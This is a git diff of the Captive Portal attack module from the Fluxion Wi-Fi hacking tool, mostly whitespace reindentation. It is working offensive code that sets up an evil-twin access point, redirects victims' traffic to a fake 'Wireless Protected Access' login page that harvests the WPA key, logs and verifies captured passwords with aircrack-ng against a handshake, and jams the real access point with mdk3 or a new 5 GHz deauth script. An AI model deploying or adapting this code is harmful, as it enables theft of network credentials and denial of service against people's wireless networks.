@@ -281,7 +281,7 @@ captive_portal_set_authenticator() {
   esac
 
   # Assure authentication method processing succeeded, abort otherwise.
-  if [[ $result -ne 0 ]]; then
+  if [ $result -ne 0 ] && [ "$FLUXIONDebug" == "" ]; then
     echo "Auth-mode error code $result!" > $FLUXIONOutputPath
     return 1
   fi
@@ -637,12 +637,12 @@ default-lease-time 600;
 max-lease-time 7200;
 
 subnet $CaptivePortalGatewayNetwork.0 netmask 255.255.255.0 {
-	option broadcast-address $CaptivePortalGatewayNetwork.255;
-	option routers $CaptivePortalGatewayAddress;
-	option subnet-mask 255.255.255.0;
-	option domain-name-servers $CaptivePortalGatewayAddress;
+    option broadcast-address $CaptivePortalGatewayNetwork.255;
+    option routers $CaptivePortalGatewayAddress;
+    option subnet-mask 255.255.255.0;
+    option domain-name-servers $CaptivePortalGatewayAddress;
 
-	range $CaptivePortalGatewayNetwork.100 $CaptivePortalGatewayNetwork.254;
+    range $CaptivePortalGatewayNetwork.100 $CaptivePortalGatewayNetwork.254;
 }\
 " >"$FLUXIONWorkspacePath/dhcpd.conf"
 
@@ -654,23 +654,23 @@ subnet $CaptivePortalGatewayNetwork.0 netmask 255.255.255.0 {
 server.document-root = \"$FLUXIONWorkspacePath/captive_portal/\"
 
 server.modules = (
-	\"mod_access\",
-	\"mod_alias\",
-	\"mod_accesslog\",
-	\"mod_fastcgi\",
-	\"mod_redirect\",
-	\"mod_rewrite\"
+    \"mod_access\",
+    \"mod_alias\",
+    \"mod_accesslog\",
+    \"mod_fastcgi\",
+    \"mod_redirect\",
+    \"mod_rewrite\"
 )
 
 accesslog.filename = \"$FLUXIONWorkspacePath/lighttpd.log\"
 
 fastcgi.server = (
-	\".php\" => (
-		(
-			\"bin-path\" => \"/usr/bin/php-cgi\",
-			\"socket\" => \"/tmp/fluxspace/php.socket\"
-		)
-	)
+    \".php\" => (
+        (
+            \"bin-path\" => \"/usr/bin/php-cgi\",
+            \"socket\" => \"/tmp/fluxspace/php.socket\"
+        )
+    )
 )
 
 server.port = 80
@@ -679,28 +679,28 @@ server.pid-file = \"/var/run/lighttpd.pid\"
 # server.groupname = \"www\"
 
 mimetype.assign = (
-	\".html\" => \"text/html\",
-	\".htm\" => \"text/html\",
-	\".txt\" => \"text/plain\",
-	\".jpg\" => \"image/jpeg\",
-	\".png\" => \"image/png\",
-	\".css\" => \"text/css\"
+    \".html\" => \"text/html\",
+    \".htm\" => \"text/html\",
+    \".txt\" => \"text/plain\",
+    \".jpg\" => \"image/jpeg\",
+    \".png\" => \"image/png\",
+    \".css\" => \"text/css\"
 )
 
 
 server.error-handler-404 = \"/\"
 
 static-file.exclude-extensions = (
-	\".fcgi\",
-	\".php\",
-	\".rb\",
-	\"~\",
-	\".inc\"
+    \".fcgi\",
+    \".php\",
+    \".rb\",
+    \"~\",
+    \".inc\"
 )
 
 index-file.names = (
-	\"index.htm\",
-	\"index.html\",
+    \"index.htm\",
+    \"index.html\",
     \"index.php\"
 )
 " >"$FLUXIONWorkspacePath/lighttpd.conf"
@@ -709,8 +709,8 @@ index-file.names = (
   if [ -f "$FLUXIONWorkspacePath/server.pem" -a -s "$FLUXIONWorkspacePath/server.pem" ]; then
     echo "\
 \$SERVER[\"socket\"] == \":443\" {
-	ssl.engine = \"enable\"
-	ssl.pemfile = \"$FLUXIONWorkspacePath/server.pem\"
+    ssl.engine = \"enable\"
+    ssl.pemfile = \"$FLUXIONWorkspacePath/server.pem\"
 }
 " >>"$FLUXIONWorkspacePath/lighttpd.conf"
   fi
@@ -720,24 +720,24 @@ index-file.names = (
 # The following will emulate Apple's and Google's internet connectivity checks.
 # This should help with no-internet-connection warnings in some devices.
 \$HTTP[\"host\"] == \"captive.apple.com\" { # Respond with Apple's captive response.
-	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Apple/\"
+    server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Apple/\"
 }
 
 # Respond with Google's captive response on certain domains.
 # Domains: www.google.com, clients[0-9].google.com, connectivitycheck.gstatic.com, connectivitycheck.android.com, android.clients.google.com, alt[0-9]-mtalk.google.com, mtalk.google.com
 \$HTTP[\"host\"] =~ \"((www|(android\.)?clients[0-9]*|(alt[0-9]*-)?mtalk)\.google|connectivitycheck\.(android|gstatic))\.com\" {
-	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Google/\"
-	url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
+    server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Google/\"
+    url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
 }
 " >>"$FLUXIONWorkspacePath/lighttpd.conf"
   else
     echo "\
 # Redirect all traffic to the captive portal when not emulating a connection.
 \$HTTP[\"host\"] != \"captive.gateway.lan\" {
-	url.redirect-code = 302
-	url.redirect  = (
-		\"^/(.*)\" => \"http://captive.gateway.lan/\",
-	)
+    url.redirect-code = 302
+    url.redirect  = (
+        \"^/(.*)\" => \"http://captive.gateway.lan/\",
+    )
 }
 " >>"$FLUXIONWorkspacePath/lighttpd.conf"
   fi
@@ -835,12 +835,12 @@ if __name__ == '__main__':
 #!/usr/bin/env bash
 
 signal_stop_attack() {
-	kill -s SIGABRT $$ # Signal STOP ATTACK
-	handle_abort_authenticator
+    kill -s SIGABRT $$ # Signal STOP ATTACK
+    handle_abort_authenticator
 }
 
 handle_abort_authenticator() {
-	AuthenticatorState=\"aborted\"
+    AuthenticatorState=\"aborted\"
 }
 
 trap signal_stop_attack SIGINT SIGHUP
@@ -851,12 +851,12 @@ echo -n \"0\"> \"$FLUXIONWorkspacePath/hit.txt\"
 
 # Assure we've got a directory to store net logs into.
 if [ ! -d \"$CaptivePortalNetLog\" ]; then
-	mkdir -p \"$CaptivePortalNetLog\"
+    mkdir -p \"$CaptivePortalNetLog\"
 fi
 
 # Assure we've got a directory to store pwd logs into.
 if [ ! -d \"$CaptivePortalPassLog\" ]; then
-	mkdir -p \"$CaptivePortalPassLog\"
+    mkdir -p \"$CaptivePortalPassLog\"
 fi
 
 # Make console cursor invisible, cnorm to revert.
@@ -873,109 +873,109 @@ AuthenticatorState=\"running\"
 startTime=\$(date +%s)
 
 while [ \$AuthenticatorState = \"running\" ]; do
-	let s=\$(date +%s)-\$startTime
+    let s=\$(date +%s)-\$startTime
 
-	d=\`expr \$s / 86400\`
-	s=\`expr \$s % 86400\`
-	h=\`expr \$s / 3600\`
-	s=\`expr \$s % 3600\`
-	m=\`expr \$s / 60\`
-	s=\`expr \$s % 60\`
+    d=\`expr \$s / 86400\`
+    s=\`expr \$s % 86400\`
+    h=\`expr \$s / 3600\`
+    s=\`expr \$s % 3600\`
+    m=\`expr \$s / 60\`
+    s=\`expr \$s % 60\`
 
-	if [ \"\$s\" -le 9 ]; then
-		is=\"0\"
-	else
-		is=
-	fi
+    if [ \"\$s\" -le 9 ]; then
+        is=\"0\"
+    else
+        is=
+    fi
 
-	if [ \"\$m\" -le 9 ]; then
-		im=\"0\"
-	else
-		im=
-	fi
+    if [ \"\$m\" -le 9 ]; then
+        im=\"0\"
+    else
+        im=
+    fi
 
-	if [ \"\$h\" -le 9 ]; then
-		ih=\"0\"
-	else
-		ih=
-	fi
+    if [ \"\$h\" -le 9 ]; then
+        ih=\"0\"
+    else
+        ih=
+    fi
 
-	if [ -f \"$FLUXIONWorkspacePath/pwdattempt.txt\" -a -s \"$FLUXIONWorkspacePath/pwdattempt.txt\" ]; then
-		# Save any new password attempt.
-		cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"
+    if [ -f \"$FLUXIONWorkspacePath/pwdattempt.txt\" -a -s \"$FLUXIONWorkspacePath/pwdattempt.txt\" ]; then
+        # Save any new password attempt.
+        cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"
 
-		# Clear logged password attempt.
-		echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
-	fi
+        # Clear logged password attempt.
+        echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
+    fi
 
-	if [ -f \"$FLUXIONWorkspacePath/ip_hits\" -a -s \"$FLUXIONWorkspacePath/ip_hits.txt\" ]; then
-		cat \"$FLUXIONWorkspacePath/ip_hits\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
-		echo \" \" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
-		echo -n > \"$FLUXIONWorkspacePath/ip_hits\"
-	fi
+    if [ -f \"$FLUXIONWorkspacePath/ip_hits\" -a -s \"$FLUXIONWorkspacePath/ip_hits.txt\" ]; then
+        cat \"$FLUXIONWorkspacePath/ip_hits\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
+        echo \" \" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
+        echo -n > \"$FLUXIONWorkspacePath/ip_hits\"
+    fi
 
 " >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
   if [ $CaptivePortalAuthenticatorMode = "hash" ]; then
     echo "
-	if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
-		# Check if we've got the correct password by looking for anything other than \"Passphrase not in\".
-		if ! aircrack-ng -b $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$CaptivePortalHashPath\" | grep -qi \"Passphrase not in\"; then
+    if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
+        # Check if we've got the correct password by looking for anything other than \"Passphrase not in\".
+        if ! aircrack-ng -b $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$CaptivePortalHashPath\" | grep -qi \"Passphrase not in\"; then
             echo \"2\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
 
-			sleep 1
-			break
+            sleep 1
+            break
 
-		else
-			echo \"1\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
+        else
+            echo \"1\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
 
-		fi
-	fi" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+        fi
+    fi" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
   fi
 
   local -r staticSSID=$(printf "%q" "$FluxionTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")
   echo "
-	readarray -t DHCPClients < <(nmap -PR -sn -n -oG - $CaptivePortalGatewayNetwork.100-110 2>&1 | grep Host)
+    readarray -t DHCPClients < <(nmap -PR -sn -n -oG - $CaptivePortalGatewayNetwork.100-110 2>&1 | grep Host)
 
-	echo
-	echo -e \"  ACCESS POINT:\"
-	printf  \"    SSID ...........: $CWht%s$CClr\\n\" \"$staticSSID\"
-	echo -e \"    MAC ............: $CYel$FluxionTargetMAC$CClr\"
-	echo -e \"    Channel ........: $CWht$FluxionTargetChannel$CClr\"
-	echo -e \"    Vendor .........: $CGrn${FluxionTargetMaker:-UNKNOWN}$CClr\"
-	echo -e \"    Runtime ........: $CBlu\$ih\$h:\$im\$m:\$is\$s$CClr\"
-	echo -e \"    Attempts .......: $CRed\$(cat $FLUXIONWorkspacePath/hit.txt)$CClr\"
-	echo -e \"    Clients ........: $CBlu\$(cat $FLUXIONWorkspacePath/clients.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)$CClr\"
-	echo
-	echo -e \"  CLIENTS ONLINE:\"
+    echo
+    echo -e \"  ACCESS POINT:\"
+    printf  \"    SSID ...........: $CWht%s$CClr\\n\" \"$staticSSID\"
+    echo -e \"    MAC ............: $CYel$FluxionTargetMAC$CClr\"
+    echo -e \"    Channel ........: $CWht$FluxionTargetChannel$CClr\"
+    echo -e \"    Vendor .........: $CGrn${FluxionTargetMaker:-UNKNOWN}$CClr\"
+    echo -e \"    Runtime ........: $CBlu\$ih\$h:\$im\$m:\$is\$s$CClr\"
+    echo -e \"    Attempts .......: $CRed\$(cat $FLUXIONWorkspacePath/hit.txt)$CClr\"
+    echo -e \"    Clients ........: $CBlu\$(cat $FLUXIONWorkspacePath/clients.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)$CClr\"
+    echo
+    echo -e \"  CLIENTS ONLINE:\"
 
-	x=0
-	for client in \"\${DHCPClients[@]}\"; do
-		x=\$((\$x+1))
+    x=0
+    for client in \"\${DHCPClients[@]}\"; do
+        x=\$((\$x+1))
 
-		ClientIP=\$(echo \$client| cut -d \" \" -f2)
-		ClientMAC=\$(nmap -PR -sn -n \$ClientIP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])
+        ClientIP=\$(echo \$client| cut -d \" \" -f2)
+        ClientMAC=\$(nmap -PR -sn -n \$ClientIP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])
 
-		if [ \"\$(echo \$ClientMAC| wc -m)\" != \"18\" ]; then
-			ClientMAC=\"xx:xx:xx:xx:xx:xx\"
-		fi
+        if [ \"\$(echo \$ClientMAC| wc -m)\" != \"18\" ]; then
+            ClientMAC=\"xx:xx:xx:xx:xx:xx\"
+        fi
 
-		ClientMID=\$(macchanger -l | grep \"\$(echo \"\$ClientMAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
+        ClientMID=\$(macchanger -l | grep \"\$(echo \"\$ClientMAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
 
-		if echo \$ClientMAC| grep -q x; then
-			ClientMID=\"unknown\"
-		fi
+        if echo \$ClientMAC| grep -q x; then
+            ClientMID=\"unknown\"
+        fi
 
-		ClientHostname=\$(grep \$ClientIP \"$FLUXIONWorkspacePath/clients.txt\" | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')
+        ClientHostname=\$(grep \$ClientIP \"$FLUXIONWorkspacePath/clients.txt\" | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')
 
-		echo -e \"    $CGrn \$x) $CRed\$ClientIP $CYel\$ClientMAC $CClr($CBlu\$ClientMID$CClr) $CGrn \$ClientHostname$CClr\"
-	done
+        echo -e \"    $CGrn \$x) $CRed\$ClientIP $CYel\$ClientMAC $CClr($CBlu\$ClientMID$CClr) $CGrn \$ClientHostname$CClr\"
+    done
 
-	echo -ne \"\033[K\033[u\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    echo -ne \"\033[K\033[u\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
   if [ $CaptivePortalAuthenticatorMode = "hash" ]; then
     echo "
-	sleep 1" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    sleep 1" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
   fi
 
   echo "
@@ -1027,116 +1027,122 @@ captive_portal_generic() {
   echo "\
 <!DOCTYPE html>
 <html>
-	<head>
-		<meta charset=\"UTF-8\">
-		<meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
+    <head>
+        <meta charset=\"UTF-8\">
+        <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
 
-		<title>Wireless Protected Access: Verifying</title>
+        <title>Wireless Protected Access: Verifying</title>
 
-		<!-- Styles -->
-		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
-		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
+        <!-- Styles -->
+        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
+        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
 
-		<!-- Scripts -->
-		<script src=\"js/jquery-1.11.1.min.js\"></script>
-		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
-	</head>
-	<body>
-		<!-- final page -->
-		<div id=\"done\" data-role=\"page\" data-theme=\"a\">
-			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
-				<h3 style=\"text-align:center;\">$DIALOG_WEB_OK</h3>
-			</div>
-		</div>
-	</body>
+        <!-- Scripts -->
+        <script src=\"js/jquery-1.11.1.min.js\"></script>
+        <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
+    </head>
+    <body>
+        <!-- final page -->
+        <div id=\"done\" data-role=\"page\" data-theme=\"a\">
+            <div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
+                <h3 style=\"text-align:center;\">$DIALOG_WEB_OK</h3>
+            </div>
+        </div>
+    </body>
 </html>" >"$FLUXIONWorkspacePath/captive_portal/final.html"
 
   echo "\
 <!DOCTYPE html>
 <html>
-	<head>
-		<meta charset=\"UTF-8\">
-		<meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
+    <head>
+        <meta charset=\"UTF-8\">
+        <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
 
-		<title>Wireless Protected Access: Key Mismatch</title>
+        <title>Wireless Protected Access: Key Mismatch</title>
 
-		<!-- Styles -->
-		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
-		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
+        <!-- Styles -->
+        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
+        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
 
-		<!-- Scripts -->
-		<script src=\"js/jquery-1.11.1.min.js\"></script>
-		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
-		<script src=\"js/jquery.validate.min.js\"></script>
-		<script src=\"js/additional-methods.min.js\"></script>
-	</head>
-	<body>
-		<!-- Error page -->
-		<div data-role=\"page\" data-theme=\"a\">
-			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
-				<h3 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h3>
-				<a href=\"index.html\" class=\"ui-btn ui-corner-all ui-shadow\" onclick=\"location.href='index.html'\">$DIALOG_WEB_BACK</a>
-			</div>
-		</div>
-	</body>
+        <!-- Scripts -->
+        <script src=\"js/jquery-1.11.1.min.js\"></script>
+        <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
+        <script src=\"js/jquery.validate.min.js\"></script>
+        <script src=\"js/additional-methods.min.js\"></script>
+    </head>
+    <body>
+        <!-- Error page -->
+        <div data-role=\"page\" data-theme=\"a\">
+            <div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
+                <h3 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h3>
+                <a href=\"index.html\" class=\"ui-btn ui-corner-all ui-shadow\" onclick=\"location.href='index.html'\">$DIALOG_WEB_BACK</a>
+            </div>
+        </div>
+    </body>
 </html>" >"$FLUXIONWorkspacePath/captive_portal/error.html"
 
   echo "\
 <!DOCTYPE html>
 <html>
-	<head>
-		<meta charset=\"UTF-8\">
-		<meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
+    <head>
+        <meta charset=\"UTF-8\">
+        <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
 
-		<title>Wireless Protected Access: Login</title>
+        <title>Wireless Protected Access: Login</title>
 
-		<!-- Styles -->
-		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
-		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
+        <!-- Styles -->
+        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
+        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
 
-		<!-- Scripts -->
-		<script src=\"js/jquery-1.11.1.min.js\"></script>
-		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
-		<script src=\"js/jquery.validate.min.js\"></script>
-		<script src=\"js/additional-methods.min.js\"></script>
-	</head>
-	<body>
-		<!-- Main page -->
-		<div data-role=\"page\" data-theme=\"a\">
-			<div class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
-				<fieldset>
-					<form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
-						</br>
-						<div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
-							<div><u>$FluxionTargetSSID</u> ($FluxionTargetMAC)</div>
-							<!--<div>Channel: $FluxionTargetChannel</div>-->
-						</div>
-						<div style=\"text-align:center;\">
-							<br>
-							<label>$DIALOG_WEB_INFO</label>
-							<br>
-						</div>
-						<div class=\"ui-field-contain\">
-							<label for=\"key1\">$DIALOG_WEB_INPUT</label>
-							<input id=\"key1\" style=\"color:#333; background-color:#CCC\" data-clear-btn=\"true\" type=\"password\" value=\"\" name=\"key1\" maxlength=\"64\"/>
-						</div>
-						<input data-icon=\"check\" data-inline=\"true\" name=\"submitBtn\" type=\"submit\" value=\"$DIALOG_WEB_SUBMIT\"/>
-					</form>
-				</fieldset>
-			</div>
-		</div>
+        <!-- Scripts -->
+        <script src=\"js/jquery-1.11.1.min.js\"></script>
+        <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
+        <script src=\"js/jquery.validate.min.js\"></script>
+        <script src=\"js/additional-methods.min.js\"></script>
+    </head>
+    <body>
+        <!-- Main page -->
+        <div data-role=\"page\" data-theme=\"a\">
+            <div class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
+                <fieldset>
+                    <form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
+                        </br>
+                        <div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
+                            <div><u>$FluxionTargetSSID</u> ($FluxionTargetMAC)</div>
+                            <!--<div>Channel: $FluxionTargetChannel</div>-->
+                        </div>
+                        <div style=\"text-align:center;\">
+                            <br>
+                            <label>$DIALOG_WEB_INFO</label>
+                            <br>
+                        </div>
+                        <div class=\"ui-field-contain\">
+                            <label for=\"key1\">$DIALOG_WEB_INPUT</label>
+                            <input id=\"key1\" style=\"color:#333; background-color:#CCC\" data-clear-btn=\"true\" type=\"password\" value=\"\" name=\"key1\" maxlength=\"64\"/>
+                        </div>
+                        <input data-icon=\"check\" data-inline=\"true\" name=\"submitBtn\" type=\"submit\" value=\"$DIALOG_WEB_SUBMIT\"/>
+                    </form>
+                </fieldset>
+            </div>
+        </div>
 
-		<script src=\"js/main.js\"></script>
+        <script src=\"js/main.js\"></script>
 
-		<script>
-			$.extend( $.validator.messages, {
-				required: \"$DIALOG_WEB_ERROR_MSG\",
-				maxlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MAX\" ),
-				minlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MIN\" )
-			});
-		</script>
-	</body>
+        <script>
+            $.extend( $.validator.messages, {
+                required: \"$DIALOG_WEB_ERROR_MSG\",
+                maxlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MAX\" ),
+                minlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MIN\" )
+            });
+        </script>
+    </body>
 </html>" >"$FLUXIONWorkspacePath/captive_portal/index.html"
+
+if [ "$FLUXIONEnable5GHZ" != "" ];then
+    cp -r "$FLUXIONPath/attacks/Captive Portal/deauth-ng.py" "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py"
+    chmod +x "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py"
+fi
+
 }
 
 captive_portal_unset_routes() {
@@ -1184,7 +1190,7 @@ captive_portal_set_routes() {
   iptables -A INPUT -p tcp --dport 80 -j ACCEPT
   iptables -A INPUT -p udp --dport 53 -j ACCEPT
   iptables -A INPUT -p udp --dport 67 -j ACCEPT
-  
+
   iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT \
     --to-destination $CaptivePortalGatewayAddress:80
   iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT \
@@ -1421,10 +1427,14 @@ stop_attack() {
   captive_portal_stop_interface
 
   # Start the network-manager if it's disabled.
-  if ! systemctl status network-manager.service &> /dev/null; then
-    systemctl start network-manager.service
+  if systemctl status network-manager.service &> /dev/null; then
+    if [ ! -x "$(command -v systemctl)" ]; then
+      if [ -x "$(command -v service)" ];then
+          service network-manager.service
+      fi
+      systemctl stop network-manager.service
+    fi
   fi
-
   CaptivePortalState="Stopped"
 }
 
@@ -1435,12 +1445,26 @@ start_attack() {
 
   stop_attack
 
-  # Disable the network-manager if it's available.
   if systemctl status network-manager.service &> /dev/null; then
-    systemctl stop network-manager.service
+    if [ ! -x "$(command -v systemctl)" ]; then
+      if [ -x "$(command -v service)" ];then
+          service network-manager.service stop
+      fi
+      systemctl stop network-manager.service
+    fi
+  fi
+
+  if systemctl status systemd-resolved &> /dev/null; then
+    if [ ! -x "$(command -v systemctl)" ]; then
+      if [ -x "$(command -v service)" ];then
+          service systemd-resolved stop
+      fi
+      systemctl stop systemd-resolved.service
+    fi
   fi
 
   captive_portal_start_interface
+
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingDHCPServiceNotice"
   xterm $FLUXIONHoldXterm $TOPLEFT -bg black -fg "#CCCC00" \
@@ -1469,16 +1493,16 @@ start_attack() {
   echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
   echo -e "$FluxionTargetMAC" >"$FLUXIONWorkspacePath/mdk3_blacklist.lst"
 
-  if ! [ -x "$(command -v mdk4)" ]; then
+  if [ "$FLUXIONEnable5GHZ" != "" ]; then
     xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-        "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
+        "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC" &
     # Save parent's pid, to get to child later.
     CaptivePortalJammerServiceXtermPID=$!
   else
     xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-        "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
+        "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
     # Save parent's pid, to get to child later.
     CaptivePortalJammerServiceXtermPID=$!
   fi
